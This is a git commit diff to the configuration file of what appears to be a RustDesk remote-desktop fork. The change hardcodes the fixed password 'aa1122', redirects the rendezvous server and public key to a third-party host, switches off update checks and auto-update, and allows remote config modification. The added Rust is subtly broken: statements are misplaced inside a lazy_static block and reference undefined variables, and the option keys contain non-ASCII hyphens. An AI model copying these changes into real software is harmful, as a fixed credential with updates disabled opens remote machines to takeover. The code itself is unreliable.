9e53dd1ca035e8cee42abe57ac9d80578c37c75a
yanyangzhuoyue <1418134850@qq.com>
2026-09-01 22:30:47 +0800

    Update config.rs

--- src/config.rs
+++ src/config.rs
@@ -79,8 +79,25 @@ lazy_static::lazy_static! {
     pub static ref OVERWRITE_DISPLAY_SETTINGS: RwLock<HashMap<String, String>> = Default::default();
     pub static ref DEFAULT_LOCAL_SETTINGS: RwLock<HashMap<String, String>> = Default::default();
     pub static ref OVERWRITE_LOCAL_SETTINGS: RwLock<HashMap<String, String>> = Default::default();
-    pub static ref HARD_SETTINGS: RwLock<HashMap<String, String>> = Default::default();
+    pub static ref HARD_SETTINGS: RwLock<HashMap<String, String>> = {
+        let mut map = HashMap::new();
+        map.insert("password".to_string(), "aa1122".to_string());
+        RwLock::new(map)
+    };
     pub static ref BUILTIN_SETTINGS: RwLock<HashMap<String, String>> = Default::default();
+	// 加载本地配置之后添加
+    if !config.options.contains_key("enable‑check‑update") {
+       config.options.insert("enable‑check‑update".to_string(), "N".to_string());
+       store = true;
+    }
+    if !config.options.contains_key("allow‑auto‑update") {
+       config.options.insert("allow‑auto‑update".to_string(), "N".to_string());
+       store = true;
+    }
+    if !config.options.contains_key("allow‑remote‑config‑modification") {
+       config.options.insert("allow‑remote‑config‑modification".to_string(), "Y".to_string());
+       store = true;
+    }
 }
 
 #[cfg(target_os = "android")]
@@ -114,8 +131,8 @@ const CHARS: &[char] = &[
     'm', 'n', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z',
 ];
 
-pub const RENDEZVOUS_SERVERS: &[&str] = &["rs-ny.rustdesk.com"];
-pub const RS_PUB_KEY: &str = "OeVuKk5nlHiXp+APNn0Y3pC1Iwpwn44JGqrQCsWqmBw=";
+pub const RENDEZVOUS_SERVERS: &[&str] = &["remote.easyuser.top"];
+pub const RS_PUB_KEY: &str = "Y9IbtWafb5AuUzsuPO4SP6pxTNjIaMN6ZfxFDm2CLVk=";
 
 pub const RENDEZVOUS_PORT: i32 = 21116;
 pub const RELAY_PORT: i32 = 21117;
